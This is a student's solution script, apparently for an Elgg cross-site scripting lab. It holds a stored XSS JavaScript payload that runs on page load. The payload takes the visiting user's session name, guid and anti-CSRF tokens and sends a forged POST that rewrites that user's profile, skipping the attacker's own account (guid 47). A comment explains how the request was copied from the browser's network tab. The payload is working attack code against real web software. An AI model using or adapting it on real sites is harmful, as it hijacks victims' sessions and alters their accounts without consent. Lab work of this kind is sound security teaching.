<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
        var sendurl="/action/profile/edit"; //FILL IN
	var username = "&name="+elgg.session.user.name;
	var uid = "&guid="+elgg.session.user.guid;
	var isSamy = elgg.session.user.guid;

	var content=token+ts+username+"&description=%3Cp%3Enothing%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=1&briefdescription=1605049&accesslevel%5Bbriefdescription%5D=1&location=newelgg&accesslevel%5Blocation%5D=1&interests=ellgg&accesslevel%5Binterests%5D=1&skills=qw&accesslevel%5Bskills%5D=1&contactemail=a%40gmail.com&accesslevel%5Bcontactemail%5D=1&phone=ee&accesslevel%5Bphone%5D=1&mobile=efe&accesslevel%5Bmobile%5D=1&website=http%3A%2F%2Fwww.efef.com&accesslevel%5Bwebsite%5D=1&twitter=efef&accesslevel%5Btwitter%5D=1"+uid; //FILL IN
	
	if(isSamy !== 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		//Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>
/*
	To construct the url, I checked in the firefox network tab how a normal edit profile POST rerquest looks like. Then, I wrote the 		sendurl variable accordingly.
	To construct the content variable, I again checked the network tab and checked the Request Body portion. Then, I figured out where to 		place the ts and token and username along with the guid.
	To change the Description to my student ID, I put my student id in the "&briefdescription=" part of the body. To change access levels 		to Logged in Users, I put "1" in all the access level fields. Similarly, I put random strings in all other fields of the form.
	I checked if the user is Samy by checking the current guid is 47 or not.   
*/


